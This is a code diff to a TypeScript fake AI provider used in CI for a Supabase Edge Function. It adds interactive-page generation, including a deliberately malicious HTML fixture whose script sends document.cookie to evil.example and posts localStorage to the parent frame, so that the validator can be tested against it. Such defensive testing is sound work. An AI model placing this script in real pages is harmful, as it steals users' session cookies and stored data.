@@ -1,15 +1,18 @@
 // Deterministic fake AI provider of the ai-generate Edge Function (AI_PROVIDER=fake: the local
 // stack in CI and development — never a real key). It answers exactly like the mock backend's
 // fake provider (src/features/ai-studio/api/fake-provider.ts, parity-tested in
-// supabase/tests/functions/fake-ai.test.ts): contract-conformant SVGs and simple Turkish texts.
-// Prompt markers trigger the error paths: "[filtre]" (safety block), "[zaman-aşımı]" (time-out),
-// "[kötü-svg]" (a malicious drawing the function's checks must reject).
+// supabase/tests/functions/fake-ai.test.ts): contract-conformant SVGs, the sample three.js page
+// and simple Turkish texts. Prompt markers trigger the error paths: "[filtre]" (safety block),
+// "[zaman-aşımı]" (time-out), "[kötü-svg]" (a malicious drawing or page the function's checks
+// must reject).
+import { samplePageHtml } from './entities/kit/index.ts'
 import {
   AiProviderError,
   type AiProvider,
   type CardTextDraft,
   type Generated,
   type KitMetaDraft,
+  type PageDraft,
 } from './gemini.ts'
 
 export const FAKE_MODEL = 'fake'
@@ -264,6 +267,21 @@ export function fakeKitMeta(topic: string, ageMin: number, ageMax: number, cardC
   return meta
 }
 
+/** Deliberately unsafe page (network, storage, the parent frame) — checkPageHtml must reject it. */
+export function maliciousPageHtml(title: string) {
+  return `<!doctype html><html lang="tr"><head><meta charset="utf-8"><title>${escapeXml(title)}</title></head><body><script type="module">fetch('https://evil.example/x?c=' + document.cookie); window.parent.postMessage(localStorage.getItem('k'), '*')</script></body></html>`
+}
+
+/** An interactive page (ADR 0023): the showcase sample, or the malicious one for "[kötü-svg]". */
+export function fakePage(title: string, prompt: string): PageDraft {
+  return {
+    title,
+    html: prompt.includes(FAKE_TRIGGERS.malicious)
+      ? maliciousPageHtml(title)
+      : samplePageHtml(title),
+  }
+}
+
 /** The error paths of the fake: a safety block or a time-out, like the mock backend. */
 function trip(prompt: string) {
   if (prompt.includes(FAKE_TRIGGERS.filter)) throw new AiProviderError('blocked', FAKE_MODEL)
@@ -309,6 +327,10 @@ export function createFakeProvider({ random = Math.random } = {}): AiProvider {
     icons: async (concept) => {
       trip(concept)
       return generated([0, 1].map((variant) => fakeIconSvg(concept, variant)))
+    },
+    page: async (input) => {
+      trip(`${input.prompt} ${input.title}`)
+      return generated(fakePage(input.title, input.prompt))
     },
   }
 }
